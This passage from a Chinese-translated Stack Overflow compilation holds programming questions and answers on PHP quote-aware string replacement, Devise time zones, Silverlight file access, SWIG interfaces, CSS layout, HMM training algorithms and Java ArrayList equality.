    $outside = preg_split($pattern, $string, -1, PREG_SPLIT_DELIM_CAPTURE);
    var_dump($outside);
    while ($outside) {
        $result .= str_replace($replace, $with, array_shift($outside)) . array_shift($outside);
    }
    return $result;
}
echo str_replace_outside_quotes('?', '%s', 'hello="is it me your are looking for\\"?" AND test=?'); 
```

## 样本输入和预期输出

```
In: hello="is it me your are looking for\\"?" AND test=? AND hello='is it me your are looking for\\'?' AND test=? hello="is it me your are looking for\\"?" AND test=?' AND hello='is it me your are looking for\\'?' AND test=?
Out: hello="is it me your are looking for\\"?" AND test=%s AND hello='is it me your are looking for\\'?' AND test=%s hello="is it me your are looking for\\"?" AND test=%s AND hello='is it me your are looking for\\'?' AND test=%s

In: my_var = ? AND var_test = "phoned?" AND story = 'he said \'where is it?!?\''
Out: my_var = %s AND var_test = "phoned?" AND story = 'he said \'where is it?!?\'' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T23:31:52.273

以下测试脚本首先检查给定字符串是否有效，仅由单引号、双引号和未引用的块组成。正`$re_valid`则表达式执行此验证任务。`preg_replace_callback()`如果字符串是有效的，那么它会使用和正则表达式一次解析字符串一个块`$re_parse`。回调函数使用 处理未引用的`preg_replace()`块，并返回所有未更改的引用块。逻辑中唯一棘手的部分是将主函数的参数值`$replace`和`$with`参数值传递给回调函数。（请注意，PHP 过程代码使这个变量从主函数传递到回调函数有点尴尬。）这是脚本：

```
<?php // test.php Rev:20121113_1500
function str_replace_outside_quotes($replace, $with, $string){
    $re_valid = '/
        # Validate string having embedded quoted substrings.
        ^                           # Anchor to start of string.
        (?:                         # Zero or more string chunks.
          "[^"\\\\]*(?:\\\\.[^"\\\\]*)*"  # Either a double quoted chunk,
        | \'[^\'\\\\]*(?:\\\\.[^\'\\\\]*)*\'  # or a single quoted chunk,
        | [^\'"\\\\]+               # or an unquoted chunk (no escapes).
        )*                          # Zero or more string chunks.
        \z                          # Anchor to end of string.
        /sx';
    if (!preg_match($re_valid, $string)) // Exit if string is invalid.
        exit("Error! String not valid.");
    $re_parse = '/
        # Match one chunk of a valid string having embedded quoted substrings.
          (                         # Either $1: Quoted chunk.
            "[^"\\\\]*(?:\\\\.[^"\\\\]*)*"  # Either a double quoted chunk,
          | \'[^\'\\\\]*(?:\\\\.[^\'\\\\]*)*\'  # or a single quoted chunk.
          )                         # End $1: Quoted chunk.
        | ([^\'"\\\\]+)             # or $2: an unquoted chunk (no escapes).
        /sx';
    _cb(null, $replace, $with); // Pass args to callback func.
    return preg_replace_callback($re_parse, '_cb', $string);
}
function _cb($matches, $replace = null, $with = null) {
    // Only set local static vars on first call.
    static $_replace, $_with;
    if (!isset($matches)) { 
        $_replace = $replace;
        $_with = $with;
        return; // First call is done.
    }
    // Return quoted string chunks (in group $1) unaltered.
    if ($matches[1]) return $matches[1];
    // Process only unquoted chunks (in group $2).
    return preg_replace('/'. preg_quote($_replace, '/') .'/',
        $_with, $matches[2]);
}
$data = file_get_contents('testdata.txt');
$output = str_replace_outside_quotes('?', '%s', $data);
file_put_contents('testdata_out.txt', $output);
?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T12:42:41.197

此正则表达式匹配有效的引号字符串。这意味着它知道转义引号。

```
^("[^\"\\]*(?:\\.[^\"\\]*)*(?![^\\]\\)")|('[^\'\\]*(?:\\.[^\'\\]*)*(?![^\\]\\)')$ 
```

准备好使用 PHP：

```
$pattern = '/^((?:"([^"\\\\]*(?:\\\\.[^"\\\\]*)*(?![^\\\\]\\\\))")|(?:\'([^\'\\\\]*(?:\\\\.[^\'\\\\]*)*(?![^\\\\]\\\\))\'))$/'; 
```

适用于`str_replace_outside_quotes()`：

```
$pattern = '/((?:"(?:[^"\\\\]*(?:\\\\.[^"\\\\]*)*(?![^\\\\]\\\\))")|(?:\'(?:[^\'\\\\]*(?:\\\\.[^\'\\\\]*)*(?![^\\\\]\\\\))\'))/'; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T17:54:09.730

**» 代码已更新以解决评论中带来的所有问题，现在可以正常工作 «**

* * *

有`$s`一个输入、`$p`一个短语字符串和`$v`一个替换变量，使用[preg_replace](http://php.net/manual/en/function.preg-replace.php)如下：

```
$r = '/\G((?:(?:[^\x5C"\']|\x5C(?!["\'])|\x5C["\'])*?(?:\'(?:[^\x5C\']|\x5C(?!\')' .
     '|\x5C\')*\')*(?:"(?:[^\x5C"]|\x5C(?!")|\x5C")*")*)*?)' . preg_quote($p) . '/';
$s = preg_match($r, $s) ? preg_replace($r, "$1" . $v, $s) : $s; 
```

检查**[这个演示](http://ideone.com/P5fFsO)**。

* * *

注意：在正则表达式中，`\x5C`表示一个`\`字符。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-13T13:29:50.250

编辑，更改答案。不适用于正则表达式（仅适用于现在的正则表达式 - 我认为使用 preg_replace 而不是 str_replace 会更好，但您可以更改它））：

```
function replace_special($what, $with, $str) {
   $res = '';
   $currPos = 0;
   $doWork = true;

   while (true) {
     $doWork = false; //pesimistic approach

     $pos = get_quote_pos($str, $currPos, $quoteType);
     if ($pos !== false) {
       $posEnd = get_specific_quote_pos($str, $quoteType, $pos + 1);
       if ($posEnd !== false) {
           $doWork = $posEnd !== strlen($str) - 1; //do not break if not end of string reached

           $res .= preg_replace($what, $with, 
                                substr($str, $currPos, $pos - $currPos));
           $res .= substr($str, $pos, $posEnd - $pos + 1);                      

           $currPos = $posEnd + 1;
       }
     }

     if (!$doWork) {
        $res .= preg_replace($what, $with, 
                             substr($str, $currPos, strlen($str) - $currPos + 1));
        break;
     }

   }   

   return $res;
}

function get_quote_pos($str, $currPos, &$type) {
   $pos1 = get_specific_quote_pos($str, '"', $currPos);
   $pos2 = get_specific_quote_pos($str, "'", $currPos);
   if ($pos1 !== false) {
      if ($pos2 !== false && $pos1 > $pos2) {
        $type = "'";
        return $pos2;
      }
      $type = '"';
      return $pos1;
   }
   else if ($pos2 !== false) {
      $type = "'";
      return $pos2;
   }

   return false;
}

function get_specific_quote_pos($str, $type, $currPos) {
   $pos = $currPos - 1; //because $fromPos = $pos + 1 and initial $fromPos must be currPos
   do {
     $fromPos = $pos + 1;
     $pos = strpos($str, $type, $fromPos);
   }
   //iterate again if quote is escaped!
   while ($pos !== false && $pos > $currPos && $str[$pos-1] == '\\');
   return $pos;
} 
```

例子：

```
 $str = 'hello ? ="is it me your are looking for\\"?" AND mist="???" WHERE test=? AND dzo=?';
   echo replace_special('/\?/', '#', $str); 
```

返回

> 你好#="你在找我吗\"?" AND mist="???" WHERE test=# AND dzo=#

## ----

--旧答案（我住在这里是因为它确实解决了一些问题，尽管不是完整的问题）

```
<?php
function str_replace_outside_quotes($replace, $with, $string){
    $result = '';
    var_dump($string);
    $pattern = '/(?<!\\\\)"/';
    $outside = preg_split($pattern, $string, -1, PREG_SPLIT_DELIM_CAPTURE);
   var_dump($outside);
    for ($i = 0; $i < count($outside); ++$i) {
       $replaced = str_replace($replace, $with, $outside[$i]);
       if ($i != 0 && $i != count($outside) - 1) { //first and last are not inside quote
          $replaced = '"'.$replaced.'"';
       }
       $result .= $replaced;
    }
   return $result;
}
echo str_replace_outside_quotes('?', '%s', 'hello="is it me your are looking for\\"?" AND test=?'); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-13T17:19:45.913

正如@ridgerunner 在对问题的评论中提到的那样，还有另一种可能的正则表达式解决方案：

```
function str_replace_outside_quotes($replace, $with, $string){
    $result = '';
    $pattern = '/("[^"\\\\]*(?:\\\\.[^"\\\\]*)*")' // hunt down unescaped double quotes
             . "|('[^'\\\\]*(?:\\\\.[^'\\\\]*)*')/s"; // or single quotes
    $outside = array_filter(preg_split($pattern, $string, -1, PREG_SPLIT_DELIM_CAPTURE));
    while ($outside) {
        $result .= str_replace($replace, $with, array_shift($outside)) // outside quotes
                .  array_shift($outside); // inside quotes
    }
    return $result;
} 
```

请注意使用`array_filter`删除从正则表达式返回的一些匹配为空并破坏此函数的交替性质。

* * *

我很快就采用了一种无正则表达式的方法。它有效，但我确信可以进行一些优化。

```
function str_replace_outside_quotes($replace, $with, $string){
    $string = str_split($string);
    $accumulation = '';
    $current_unquoted_string = null;
    $inside_quote = false;
    $quotes = array("'", '"');
    foreach($string as $char) {
        if ($char == $inside_quote && "\\" != substr($accumulation, -1)) {
            $inside_quote = false;
        } else if(false === $inside_quote && in_array($char, $quotes)) {
            $inside_quote = $char;
        }

        if(false === $inside_quote) {
            $current_unquoted_string .= $char;
        } else {
            if(null !== $current_unquoted_string) {
                $accumulation .= str_replace($replace, $with, $current_unquoted_string);
                $current_unquoted_string = null;
            }
            $accumulation .= $char;
        }
    }
    if(null !== $current_unquoted_string) {
        $accumulation .= str_replace($replace, $with, $current_unquoted_string);
        $current_unquoted_string = null;
    }
    return $accumulation;
} 
```

在我的基准测试中，它需要两倍于上述正则表达式方法的时间，并且当字符串长度增加时，正则表达式选项资源的使用不会增加太多。另一方面，上述方法随着输入文本的长度线性增加。

# ruby-on-rails - 使用设计动态设置用户时区

> ID：13360875
> 
> 赞同：4
> 
> 时间：2012-11-13T12:34:24.383
> 
> 标签：ruby-on-rails, login, devise, timezone, warden

我构建了一个 Rails 应用程序，可以帮助父母跟踪婴儿的睡眠情况。为了让它正常工作，我必须支持不同的时区。为了避免时区惹恼用户，我创建了一个小 javascript，它在登录表单中添加了一个隐藏字段，包括时区偏移量。这是代码

```
var timeZoneField = $("input[name='user_tz_offset']");
  if (timeZoneField.length) {
    var browserDate = new Date();
    var timeZoneOffsetSeconds = (browserDate.getTimezoneOffset() * 60) * -1;
    $(timeZoneField).val(timeZoneOffsetSeconds);
  } 
```

使用该字段中的数据，我将 Time.zone 设置为与该偏移量对应的任何城市。像这样的东西会生成时区

```
user_time_zone = ActiveSupport::TimeZone.[](params[:user_tz_offset].to_i)
session[:user_time_zone] = user_time_zone 
```

最后，我在 ApplicationController 中设置了时区。

```
def set_user_time_zone
  if (session[:user_id])
      Time.zone = session[:user_time_zone]
  else
    Time.zone = config.time_zone
  end
end 
```

所有这些都依赖于我自己编写的登录功能。但是，我知道我以后需要使用更好的用户管理系统，因为我自己的代码既不是很好也不是特别安全（我首先专注于其他功能）。

现在，我已经安装了 devise，它可以很好地登录和注销，网站的大多数其他功能也可以正常工作。但我不知道如何通过设计作为我的用户管理系统来处理时区支持。

一个想法是覆盖 Devise 中的 SessionsController，添加对该隐藏时区字段的检查并将其值添加到 user_session。但我对此感到担心，这感觉是个坏主意。

有没有更好的方法来添加此功能，而不强制用户在注册期间添加时区信息？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-15T12:14:19.740

经过大约 8 小时的反复试验，我想出了一个适用于现在的解决方案。也许这可能对具有类似设置的人感兴趣。

我首先向 users 表和模型中的相应属性添加一列 - `session_tz_offset`。

然后我开始研究 Warden 回调。对我有用的是在 ApplicationController 中放置一个辅助方法，并使用如下过滤器调用它：

```
before_filter :authenticate_user!, :set_session_tz_offset_for_user

helper_method :set_user_time_zone, :set_session_tz_offset_for_user

def set_session_tz_offset_for_user
  Warden::Manager.after_authentication do |user, auth, opts|
    if (params[:user])
      user.session_tz_offset = params[:user][:session_tz_offset]
      user.save
    end
  end
end 
```

after_authentication 回调在登录期间触发了几次，我不知道为什么。并非所有这些调用都有 params[:user] 字段，如果我没有检查它，我的应用程序会因`undefined method [] for nil:NilClass`错误而崩溃。

设置后，我的`session_tz_offset`其他控制器使用另一个帮助方法，也在 ApplicationController 中定义以设置`Time.zone`当前请求：

```
 def set_user_time_zone
    if (user_signed_in?)
      if(user_session[:time_zone])
        Time.zone = user_session[:time_zone]
      else
        user_session[:time_zone] = 
            ActiveSupport::TimeZone.[](current_user.session_tz_offset)
        Time.zone = user_session[:time_zone]
      end
    else
      Time.zone = config.time_zone
    end
  end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T17:01:11.460

我管理一个调度软件，我们还检查浏览器的时区，然后将其保存在数据库中并在应用程序控制器中使用 before_filter 调用它。

```
#Application Controller
before_filter :set_time_zone

private

def set_time_zone
  if current_user
    Time.zone = current_user.time_zone if current_user.time_zone
  end
end 
```

# c# - 使用 Silverlight 将文件保存在磁盘中

> ID：13360881
> 
> 赞同：-1
> 
> 时间：2012-11-13T12:35:07.887
> 
> 标签：c#, wpf, silverlight

这是我的第一个 silverlight 应用程序，我需要在我的`C:`目录中保存一个文件。我的 Silverlight 应用程序将与我的网络摄像头建立连接，然后我将拍摄快照，然后将其保存在我的`C:`目录中。

**看看我做了什么**

```
protected void photoButton_Click(object sender, RoutedEventArgs e)
        {
            this.src.CaptureImageCompleted += (s, a) =>
            {
                this.lastSnapshot = a.Result;
                this.snapshot.Visibility = Visibility.Visible;
                this.snapshot.Source = this.lastSnapshot;
                this.src.Stop();

                if (this.lastSnapshot != null)
                {
                    var pngStream = this.GetPngStream(lastSnapshot);
                    byte[] binaryData = new Byte[pngStream.Length];
                    long bytesRead = pngStream.Read(binaryData, 0, (int)pngStream.Length);

                    WriteBytesToFile("imagem.png", binaryData);
                }
            };

            src.CaptureImageAsync();
        }

        static public void WriteBytesToFile(string fileName, byte[] content)
        {            
            FileStream fs = new FileStream(fileName, FileMode.Create);
            BinaryWriter w = new BinaryWriter(fs);
            try
            {
                w.Write(content);
            }
            finally
            {
                fs.Close();
                w.Close();
            }
        } 

   protected Stream GetPngStream(WriteableBitmap bmp)
    {
        // Use Joe Stegman's PNG Encoder
        // http://bit.ly/77mDsv
        EditableImage imageData = new EditableImage(bmp.PixelWidth, bmp.PixelHeight);

        for (int y = 0; y < bmp.PixelHeight; ++y)
        {
            for (int x = 0; x < bmp.PixelWidth; ++x)
            {

                int pixel = bmp.Pixels[bmp.PixelWidth * y + x];

                imageData.SetPixel(x, y,
                            (byte)((pixel >> 16) & 0xFF),
                            (byte)((pixel >> 8) & 0xFF),
                            (byte)(pixel & 0xFF),
                            (byte)((pixel >> 24) & 0xFF)
                            );

            }
        }

        return imageData.GetStream();
    } 
```

在我`WriteBytesToFile`的错误`File operation not permitted. Access to path is denied.`中。如何`C:`使用名称将快照保存在我的目录中`imagem.png`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:57:22.153

Silverlight applications run in a [sandbox by default](http://msdn.microsoft.com/en-us/library/dd470128%28v=vs.95%29.aspx) and do not have any direct access to the file system. For a Silverlight application to have access to the local file system it must be installed as a [trusted applicaiton](http://msdn.microsoft.com/en-us/library/ee721083%28v=vs.95%29.aspx). A trusted Silverlight 5 application will have access to the entire hard drive, but a Silverlight 4 application will only have access to the MyDocuments, MyMusic, MyPictures, and MyVideos folders.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-14T12:26:49.937

It's better to use File.WriteAllBytes(string path, byte[] data)

# python - 如何创建 SWIG 接口文件？

> ID：13360884
> 
> 赞同：2
> 
> 时间：2012-11-13T12:35:24.470
> 
> 标签：python, swig

我是 SWIG 的新手

而且做事的时间更少。我正在尝试将 c++ 类绑定到 python。我已经在 Windows 中设置了 SWIG 并尝试运行它。成功了

我的 example.i 文件就像

```
/* File: example.i */
%module example

%{
#define SWIG_FILE_WITH_INIT
#include "Item.h"
}%
#include "Item.h" 
```

但它似乎必须包含或声明头文件类、构造函数、模板等......

任何人都可以建议如何创建 SWIG 接口文件。

以下是我需要创建接口文件的头文件（Item.h）。

```
#ifndef __ITEM_H__
#define __ITEM_H__

#include <complex>
#include <functional>
#include <string>

template<typename T>
class Item
{
  std::string name_;
  T val_;

public:
  Item(std::string name, T val) : name_(name), val_(val) {}
  Item(Item<T> &rhs) : name_(rhs.name_), val_(rhs.val_) {}
  Item(const Item<T> &rhs) : name_(rhs.name_), val_(rhs.val_) {}
  ~Item() {}

  std::string name() const { return name_; }
  T operator()() const { return val_; }
  double norm() const { return sqrt(val_ * val_); }
};

template<>
class Item<std::complex<double> >
{
  std::string name_;
  std::complex<double> val_;

public:
  Item(std::string name, std::complex<double> val) : name_(name), val_(val) {}
  Item(Item<std::complex<double> > &rhs) : name_(rhs.name_), val_(rhs.val_) {}
  Item(const Item<std::complex<double> > &rhs) : name_(rhs.name_), val_(rhs.val_) {}
  ~Item() {}

  std::string name() const { return name_; }
  std::complex<double> operator()() const { return val_; }
  double norm() const { return sqrt(val_.real() * val_.real() + val_.imag() * val_.imag()); }
};

template<typename T>
struct ItemComparator : public std::binary_function<Item<T>, Item<T>, bool>
{
  inline bool operator()(Item<T> lhs, Item<T> rhs)
  {
    return lhs.norm() < rhs.norm();
  }
};

#endif 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-14T03:28:17.450

这是您示例的接口文件。SWIG 内置了对 std::string 和 std::complex 的支持。您必须通过 %template 声明要使用的模板的具体类：

```
%module Item

%{
#include "Item.h"
%}

%include <std_string.i>
%include <std_complex.i>
%include "Item.h"
%template(Int) Item<int>;
%template(Complex) Item<std::complex<double> >; 
```

像这样使用它：

```
>>> import Item
>>> a=Item.Int('Int1',5)
>>> b=Item.Complex('Cplx1',2+3j)
>>> a.name()
'Int1'
>>> b.name()
'Cplx1'
>>> a.norm()
5.0
>>> b.norm()
3.605551275463989 
```

# html - 使用 CSS 在两列和一列布局之间自动切换

> ID：13360890
> 
> 赞同：0
> 
> 时间：2012-11-13T12:35:36.097
> 
> 标签：html, css, layout

我有一个固定宽度的简单两列布局。

```
<div id='box'>
    <div id='ontop'>Ontop</div>
    <div id='column1'>Column1</div>
    <div id='column2'>Column1</div>
</div> 
```

CSS：

```
#box { width: 20em; }
#column1 {width: 12em;}
#column2 {float: left; width: 8em;} 
```

如果为空或不存在，我想`column1`扩展为“100%” 。`column2`

**是否可以仅使用 CSS 而无需 Javascript**来做到这一点？

*编辑：更改#column1 宽度。示例有一个错误，在顶部添加了 div。*

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T13:00:14.797

如果您的元素顺序相反，这实际上更容易。

```
<div id='box'>
    <div id='column2'></div>
    <div id='column1'></div>
</div>

#column2 + #column1 { width: 10em } 
```

如果它们必须保持您指定的顺序，那么使用表格显示属性就可以了（当 #column2 较短时，#column1 不会在 #column2 周围流动）：

```
#box { width: 20em; display: table }
#column1, #column2 { display: table-cell }
#column2 { width: 8em; } /* you'll want to add some margin/padding here */ 
```

请注意，这些解决方案仅涵盖#column2 不存在的情况。如果您想查看一个元素是否为空（或非空），您需要使用与: `:empty`链接的伪类（这可能不是确切的语法）。`:not``#column2:not(:empty)`

编辑：其他选项可以包括查看#column1 是唯一的孩子（`#column1:only-child`）还是第一个/最后一个孩子，而它应该是最后一个/第一个孩子（`#column1:first-child`/ `#column1:last-child`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:38:01.600

如果未定义，Div 将始终回退到 100% 宽度。所以我会设置如下：

```
#box { width: 20em; }
#column1 {width: auto;}
#column2 {float: left; width: 8em; margin-left: 2em; } 
```

您必须确保`<div id="column2">..</div>`在不需要时不存在。

# algorithm - Viterbi 训练或 Baum-Welch 算法来估计转换和发射概率？

> ID：13360892
> 
> 赞同：9
> 
> 时间：2012-11-13T12:35:44.127
> 
> 标签：algorithm, hidden-markov-models, viterbi, expectation-maximization

我正在尝试使用 Viterbi 算法在 HMM 上找到最可能的路径（即状态序列）。但是，我不知道转换和发射矩阵，我需要从观察（数据）中估计。

要估计这些矩阵，我应该使用哪种算法：Baum-Welch 或 Viterbi 训练算法？为什么？

如果我应该使用维特比训练算法，谁能给我一个好的伪代码（不容易找到）？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-15T14:54:46.217

给定足够的资源，您可能应该使用 Baum-Welch（向前-向后）算法而不是 Viterbi**训练**算法（又名分段 k 均值算法），这是一种替代参数估计过程，牺牲了 Baum-Welch 的一些通用性以提高计算效率. 一般来说，Baum-Welch 算法会给出导致更好性能的参数，尽管在某些情况下情况[并非如此。](http://gtts.ehu.es/gtts/NT/fulltext/RodriguezEtal03b.pdf)这是一个很好的[比较研究](http://www.isi.edu/~galstyan/papers/hmm_parameter_nips.pdf)。

此外，请注意您应该使用 Baum-Welch 算法来估计模型的参数。这使用类似于 EM 算法的方法设置发射概率和传输概率。训练 HMM 后，您将使用 Viterbi**解码**算法来计算最有可能产生观察结果的状态序列。

* * *

参考方面，我会推荐[Speech and Language Processing](http://www.cs.colorado.edu/~martin/slp.html)、[Artificial Intelligence a Modern Approach](http://www.amazon.co.uk/Artificial-Intelligence-Approach-International-Edition/dp/0130803022)或[这篇论文](http://www.ece.ucsb.edu/Faculty/Rabiner/ece259/Reprints/tutorial%20on%20hmm%20and%20applications.pdf)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-01T03:52:42.987

来自[http://nlp.stanford.edu/courses/lsa352/lsa352.lec7.6up.pdf](http://nlp.stanford.edu/courses/lsa352/lsa352.lec7.6up.pdf)：

> 与 Baum-Welch 相比，Viterbi Training 是：
> 
> *   快多了
> *   但效果不太好
> *   但这种权衡往往是值得的。

一些比较研究：

*   罗德里格斯、路易斯·哈维尔和伊内斯·托雷斯。“[*用于阅读和自发语音识别的 Baum-Welch 和 Viterbi 训练算法的比较研究*](https://scholar.google.com/scholar?cluster=11326385562787773947&hl=en&as_sdt=0,22)。” 在伊比利亚模式识别和图像分析会议上，第 847-857 页。施普林格柏林海德堡，2003 年。

    *   [https://pdfs.semanticscholar.org/e58c/7d1e9d64221e5f0b424f5e22b6dede369c8d.pdf](https://pdfs.semanticscholar.org/e58c/7d1e9d64221e5f0b424f5e22b6dede369c8d.pdf)（特别是见结论部分）

[在 Statistics Stack Exchange: Differences between Baum-Welch and Viterbi training](https://stats.stackexchange.com/q/581/12359)上也提出了同样的问题。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-06-01T11:18:25.387

你必须通过鲍姆韦尔奇算法找出隐藏的马尔可夫模型参数。baum welch 使用前向和后向算法来找出 hmm 参数。

我有一个 python 中 baum welch 算法代码的链接，只需检查一下即可： [https ://jyyuan.wordpress.com/2014/01/28/baum-welch-algorithm-finding-parameters-for-our-hmm/](https://jyyuan.wordpress.com/2014/01/28/baum-welch-algorithm-finding-parameters-for-our-hmm/)

# android - 如何创建自定义对话框屏幕imageview android？

> ID：13360896
> 
> 赞同：1
> 
> 时间：2012-11-13T12:36:07.853
> 
> 标签：android, image

我的应用程序会将账单加载`Image`到`ImageView`. 然后我想创建一个正方形`Frame`，就像我想裁剪一个`Image`. 这`Frame`可以移动到应用程序背景的任何位置。这`Frame`类似于放大镜。当我要签名时，我只需点击`Frame`，它会立即放大 中的背景区域`Frame`，我刚刚注册了。我的想法是这样的。现在，我不知道这是如何创建的`Frame`？你能帮助我吗？

# java - Java ArrayList：当arraylist包含给定对象时，contains()方法返回false

> ID：13360898
> 
> 赞同：4
> 
> 时间：2012-11-13T12:36:20.830
> 
> 标签：java, arrays, arraylist, contains, evaluation

我对`contains()`返回 false 的方法有疑问，即使`ArrayList`包含给定的`Object`. 我的代码如下：

```
String [] transaction = dbConnection.getPendingTransaction(username);
if (!onlineConnection.getSentTransactionRequests().contains(transaction)) {
    onlineConnection.getSentTransactionRequests().add(transaction);

    String packet = "RTR" + "_" + transaction[0] + "_" + transaction[2] + 
                        "_" + transaction[3] + "_" + transaction[4];
    onlineConnection.send(packet);
} 
```

我`Thread.sleep()`在迭代之间进行了尝试，所以`ArrayList`没有成功加载。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-13T12:46:06.237

`hashCode()`和`equals()`of 数组在谈到这个时有点坏了（这是一个很长的不同讨论为什么）。

一种可能的解决方法是使用`ArrayList<ArrayList<String>>`而不是`ArrayList<String[]>`，`equals()`方法`ArrayList`将如您所愿。

例如：

```
 ArrayList<String> l1 = new ArrayList<>();
    ArrayList<String> l2 = new ArrayList<>();
    l1.add("asdf");
    l2.add("asdf");
    ArrayList<ArrayList<String>> coll = new ArrayList<>();
    coll.add(l1);
    System.out.println(coll.contains(l2)); 
```

`true`正如预期的那样，将产生

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:43:26.790

查看 getPendingTransaction 和 getSentTransactionRequests 是否应该返回相同的数组而不是创建新的数组。其次，尝试调试并查找数组对象 ID。如果这不一样，但应该是（并且包含相同的元素），请尝试解决此问题（例如创建比较器或列表或类似的东西）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:53:35.927

问题是`equals`对于数组被定义为引用相等。换句话说，包含相同元素的两个不同数组不相等……根据`equals`方法。

如果您希望`equals`“事务”对象基于字符串的相等性，则需要创建一个自定义类来保存`String[]`，并覆盖`equals`方法和`hashcode`方法。

* * *

顺便说一句，数组`equals(Object)`方法不是“有点破”。定义的语义`equals`只是反映了任何数组对象本质上是可变的事实。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T12:39:45.067

这是因为`String [] transaction`是对象。当您调用`contains`list 时，使用方法将新对象与其他对象进行比较`equals`。想象它喜欢做

```
new Object().equals(new Object()) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-13T13:03:26.650

如果你必须使用`List<String[]>`，可能是你运气不好，`equals()`或者`hashCode()`看起来......

也许你最好创建方法来比较你的对象

就像是

```
public static boolean stringArrayListEquals(List<String[]> list, List<String[]> list2) {
    if (list.size() != list2.size()) return false;
    for (int i = 0; i < list.size(); ++i){
        if (!Arrays.equals(list.get(i), list2.get(i)) return false;
    }
    return true;
} 
```

要测试`contains()`，您需要另一个循环...

尽管您应该认真使用`List<List<String>>`。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-04-19T11:05:49.813

我遇到过类似的问题。我刚刚写了下面的代码片段：

```
assertContains(list, toLookFor);  // To call the below private method  

private void assertContains(ArrayList<String> list, String toLookFor) {
        String arrayListToString = rulesList.toString();

         if (arrayListToString.contains(toLookFor))
                System.out.println("The list contains "+ toLookFor);
            else
                System.out.println("The list does not contains "+ toLookFor);

    } 
```

# html - 样式不适用于 ASP Classic 站点的元素

> ID：13360899
> 
> 赞同：0
> 
> 时间：2012-11-13T12:36:26.657
> 
> 标签：html, css, asp-classic

我正在重新设计 ASP Classic 网站。整个站点有一个名为 Main 的主要 CSS 文件，其中包含所有样式。这个文件中没有很多样式，因为当前设计几乎是默认的。一些页面元素的样式是内联的。

这项任务对我来说似乎很简单。我只是在 Main.css 中将所有基本元素的样式更改为新设计，但我的问题是某些页面的元素并没有改变它们的样式，即使我是内联编写的。有时元素会改变它们的一些样式属性，但总体上不会。有时，新样式只是将页面布局搞砸了，超出了我的理解。

Main.css 包含在那些有问题的页面中。所有这些页面内部都有大量的 ASP 代码，包含业务逻辑。我不是 ASP Classic pro，所以我想知道是什么导致这些元素不符合基本的 HTML 和 CSS 样式？

例如（我来自俄罗斯，但样本应该很清楚）：

这是其中一个 ASP 页面的代码： ![在此处输入图像描述](../Images/1a232455018a69807fd884d54596ea5a.png)

结果如下： ![在此处输入图像描述](../Images/d742bbc1ada3775e0a9d1d5fceb3fda3.png)

这是我从样式观察者（IE9）那里得到的：

内联样式的输入按钮： ![在此处输入图像描述](../Images/5f72d257a69e36ff7b0e3e6091b24777.png)

Main.css 样式的输入按钮： ![在此处输入图像描述](../Images/0f6b5fb8ec522a54da0918a0134be7d1.png)

如您所见，如果我使用内联样式，则只有它的一部分适用，这很奇怪。如果我用`Main.css`文件应用样式，它只会从 BODY 标签继承，不会对`input[type="button"]`选择器做出反应。在其他页面上，这个选择器工作得很好。

UPD1。看起来我通过更改为`</link/>`和相同的. 但这并没有解决我的问题。该页面仍然识别 Main.css 文件的存在并将它的一部分（例如 BODY 标记样式）分配给我的按钮，但是它不识别与按钮本身关联的样式。`</input/>``<link ...></link>``<link .../>``input`

UPD2。我发现很奇怪的事情。有问题的页面收到的`Main.css`文件与原始文件不同！此文件中的元素缺少一些原始属性，例如：

原文`Main.css`：

```
INPUT.button {
    min-width: 143px;
    font-face: Arial;
    height: 34px;
    border: 1px solid grey;
    background: #FCFCFC;
    border-radius: 7px;
    box-shadow: 0 0 2px grey;
    padding-left: 10px;
    padding-right: 10px;    
} 
```

收到`Main.css`：

```
INPUT.button {
    min-width: 143px;
    font-face: Arial;
    height: 34px;
    border: 1px solid grey;
    background: #FCFCFC;
    padding-left: 10px;
    padding-right: 10px;    
} 
```

看起来它只是跳过了一些属性，这怎么可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T07:07:29.657

所以问题是一些页面错过了`<!DOCTYPE html>`标签。此外，那些有问题的页面在标签之前有一部分 ASP 代码`<html>`，这反过来又使整个页面呈现错误。为了修复它，我只是将所有 ASP 代码移到`<head>`标签内，现在一切正常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:40:01.190

Asp 与样式无关。您需要在渲染后查看应用的样式。我会推荐 Chrome。如果您右键单击一个元素，您可以选择“检查元素”，右侧有一个框，您可以在其中准确地看到应用于元素的样式。那时，只需找出违规风格的来源即可。

很可能您有一个内联样式，该样式正在与您的新样式冲突的某个包含的 asp 页面中呈现。一旦您使用 Chrome 找出正在注入的样式，您就可以查找该样式的定义位置。

# c# - 手动创建字符串资源文件不适用于应用程序

> ID：13360901
> 
> 赞同：7
> 
> 时间：2012-11-13T12:36:31.957
> 
> 标签：c#, asp.net-mvc, visual-studio-2012

